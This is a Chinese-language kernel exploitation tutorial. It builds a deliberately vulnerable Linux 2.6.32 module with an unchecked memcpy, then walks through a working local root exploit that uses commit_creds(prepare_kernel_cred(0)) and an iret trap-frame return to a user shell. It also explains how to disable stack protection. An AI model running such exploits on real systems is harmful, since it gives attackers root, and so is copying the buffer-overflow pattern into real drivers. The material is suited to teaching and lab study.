# how2kernel————第三节stack_smashing

## Author: Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>无论是kernel态还是用户态都存在栈溢出，这也是漏洞中十分经典的一种。原理都是一样的，没有对缓冲区的大小进行检查，溢出覆盖至返回地址就可以劫持程序流程控制之。因为有了前两节的铺垫了理解这个应该不会难，先来看漏洞代码：</font></br>

```C
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

int bug2_write(struct file *file, const char *buf, unsigned long len)
{
    char localbuf[8];
    memcpy(localbuf, buf, len);
    return len;
}

static int __init stack_smashing_init(void)
{
    printk(KERN_ALERT "stack_smashing driver init!\n");
    create_proc_entry("bug2", 0666, 0)->write_proc = bug2_write;
    return 0;
}

static void __exit stack_smashing_exit(void)
{
    printk(KERN_ALERT "stack_smashing driver exit!\n");
}

module_init(stack_smashing_init);
module_exit(stack_smashing_exit);
```

**poc**

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

int main()
{
    char buf[24] = {0};
    memset(buf, 'A', 24);
    *((void **)(buf + 20)) = 0x42424242;
    int fd = open("/proc/bug2", O_WRONLY);
    write(fd, buf, sizeof(buf));
    return 0;
}

```



**Makefile**

```makefile
obj-m := stack_smashing.o  

KERNELDR := /home/fanda/Desktop/file/linux-2.6.32.1
BUSYDIR  := /home/fanda/Desktop/file/busybox-1.29.3/_install/mytest
PWD := $(shell pwd)  

modules:  
	$(MAKE) -C $(KERNELDR) M=$(PWD) modules  
	gcc -o poc poc.c -static
	rm $(BUSYDIR)/*.ko
	cp *.ko $(BUSYDIR)
	cp poc $(BUSYDIR)
	cd $(BUSYDIR)/../ && find . | cpio -o --format=newc > ../rootfs.img
clean:  
	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>用boot.sh启动qemu之后，直接执行poc可以发现eip最后地址为0x42424242（如果不行的话应该是开了栈保护，编辑linux kernel目录下的**\.config**文件，注释掉"CONFIG\_CC\_STACKPROTECTOR=y"重新make一下就行了），偏移可以根据调试得到，函数ret末尾的汇编如下：</font></br>

```assembly
   0xc883001e <bug2_write+30>    je     bug2_write+34 <0xc8830022>
    ↓
   0xc8830022 <bug2_write+34>    add    esp, 8
   0xc8830025 <bug2_write+37>    pop    esi
   0xc8830026 <bug2_write+38>    pop    edi
   0xc8830027 <bug2_write+39>    pop    ebp
 ► 0xc8830028 <bug2_write+40>    ret    <0x8048ea2>

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以最后需要填充的大小为8（add esp,8）+4（pop esi）+4（pop edi）+4（pop ebp）=20，随后的一个4就会被ret放入eip返回，成功劫持流程。知道了如何劫持流程之后我们很轻松的用commit_creds(prepare_kernel_cred(0))提权，但难处就在于如何返回一个用户层的shell（**我们不能在kernel态直接执行用户层的代码'system("/bin/sh");'来getshell**）。这里我们就用到了ROP，ROP是栈溢出中一个非常经典的技术，在这道题中我们可以**自己编写ROP**。所以我们的步骤是：</font></br>

- 构造好**trap_frame**结构；
- 控制eip到ROP跳板指令上；
- 用ROP指令返回到用户层的system("/bin/sh")。

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>那么问题来了，trap_frame结构是什么？在Linux中，程序执行时从kernel态返回到用户态时要执行一个“iret”指令，这个指令可以理解为“ret”指令的升级版。对于“ret”指令来说，可以理解为就是一个简单的“pop eip”，而“iret”指令相当于把栈上的trap_frame结构一个一个pop给相应的寄存器，这个trap_frame结构如下表示：</font></br>

```C
struct trap_frame {
    void *eip;       // instruction pointer +0
    uint32_t cs;     // code segment +4
    uint32_t eflags; // CPU flags +8
    void *esp;       // stack pointer +12
    uint32_t ss;     // stack segment +16
} __attribute__((packed));
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这个\_\_attributu\_\_((packed))是GNU C的一大特点，这个声明了struct采用紧缩型结构，也就是不存在对齐行为。里面的变量有多大，这个struct结构体就有多大。现在我们明白了内核态的栈上有这么一个东西后就可以开始着手构造exploit了：</font></br>

- 构造trap_frame结构，设置其中的eip为system("/bin/sh")；
- 控制内核态中的eip执行提权指令后执行ROP指令
- ROP指令为设置esp为构造的trap_frame地址后用iret返回
- getshell

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以最终我们的poc如下：</font></br>

**poc**

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame {
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void get_shell(void)
{
    execl("/bin/sh", "sh", NULL);
}

void init_tf_work(void)
{
    asm("pushl %cs; popl tf+4;" // set cs
        "pushfl; popl tf+8;" // set eflags
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &get_shell;
    tf.esp -= 1024;
}
#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xc1067b20;
void *(*commit_creds)(void *) KERNCALL = (void *) 0xc1067980;

void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret;");
}

int main(void)
{
    char buf[24];
    memset(buf, 'A', 24);
    *((void **)(buf+20)) = &payload; // set eip to payload
    init_tf_work();
    int fd = open("/proc/bug2", O_WRONLY);
    // exploit
    write(fd, buf, sizeof(buf));
    return 0;
}

```

## 附录

**remote gdb**

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>gdbscript稍加更改就可以用了，同样使用cat /proc/modules查看模块的基地址。提权函数的地址可以使用grep prepare_kernel_cred /proc/kallsyms得到。我的gdbscript如下：</font></br>

```shell
file /home/fanda/Desktop/file/linux-2.6.32.1/vmlinux
add-symbol-file /home/fanda/Desktop/file/busybox-1.29.3/_install/mytest/stack_smashing.ko  0xc8830000
target remote :1234
b bug2_write
c
```

**makeuser**

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>创建用户，安装模块啥的用上一节的makeuser.sh就行了。</font></br>
